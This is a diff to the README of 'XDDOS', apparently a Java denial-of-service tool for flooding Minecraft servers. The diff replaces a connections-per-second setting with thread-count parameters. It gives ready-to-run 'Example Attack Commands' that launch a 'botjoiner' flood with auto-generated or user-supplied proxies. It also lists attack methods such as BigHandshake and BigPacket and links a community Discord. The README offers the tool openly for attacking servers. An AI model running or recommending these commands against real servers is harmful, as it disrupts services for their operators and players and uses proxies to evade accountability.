@@ -20,7 +20,11 @@ XDDOS has the following features:
 
 ### Things to know
 
-- CPS is the Connection per second. If you want to use the max power use `-1` as cps limit
+- About netty and loop threads
+**NETTY THREDS** those are threds that netty use in its event loop group if u dont know what to put
+               just put (no. of threads in ur system / 2) netty threads
+**Loop Thread** it request bootstrap to connect to server. 
+If u dont know what to put try 1 or 2
 - Jar is compiled used java 8. That means that you an use java 8 or above to run XDDOS
 - To get versions protocols go [here](https://wiki.vg/Protocol_version_numbers)
 
@@ -58,11 +62,11 @@ java -jar XDDOS.jar -noansi
 
 - for manual startup with colors:
 ```
-java -jar XDDOS.jar [ip] [protocol] [method] [time] [cps] [y/n]
+java -jar XDDOS.jar [ip] [protocol] [method] [time] [netty threads] [loop threads] [y/n]
 ```
 - for manual startup without colors:
 ```
-java -jar XDDOS.jar [ip] [protocol] [method] [time] [cps] [y/n] -noansi
+java -jar XDDOS.jar [ip] [protocol] [method] [time] [netty threads] [loop threads] [y/n] -noansi
 ```
 
 #### NOTE! :-
@@ -70,25 +74,24 @@ java -jar XDDOS.jar [ip] [protocol] [method] [time] [cps] [y/n] -noansi
 
 ## Example Attack Commands  
 
-- To run botjoiner for 10 seconds with 1000 cps and use auto proxy generator:
+- To run botjoiner for 10 seconds with 3 netty threads and 1 loop thread and use auto proxy generator:
 ```
-java -jar XDDOS.jar localhost:25565 47 botjoiner 10 1000 y
-```
-
-- To run botjoiner for 10 seconds with 1000 cps and use your own proxy:
-```
-java -jar XDDOS.jar localhost:25565 47 botjoiner 10 1000 n
+java -jar XDDOS.jar localhost:25565 47 botjoiner 10 3 1 y
 ```
 
-- To run botjoiner for 10 seconds with MAX POWER or CPS and use auto proxy generator:
+- To run botjoiner for 10 seconds with 3 netty threads and 1 loop thread and use your own proxy:
 ```
-java -jar XDDOS.jar localhost:25565 47 botjoiner 10 -1 y
+java -jar XDDOS.jar localhost:25565 47 botjoiner 10 3 1 n
+```
+
+- To run botjoiner for 10 seconds with 10 netty threads and 2 loop threads and use auto proxy generator:
+```
+java -jar XDDOS.jar localhost:25565 47 botjoiner 10 10 2 y
 ```
 
 
 ## Methods avilable
 
-- Aegis
 - BigHandshake
 - BigPacket
 - BotJoiner
@@ -149,4 +152,4 @@ java -jar XDDOS.jar localhost:25565 47 botjoiner 10 -1 y
 Use -noansi at the end of the command or try using another terminal like Windows Terminal
 
 ### XDDOS has a discord?
-Yes. You can join [here](https://discord.gg/U3TN8SPgvz)
+Yes. You can join [here](https://dsc.gg/TEAMXD)
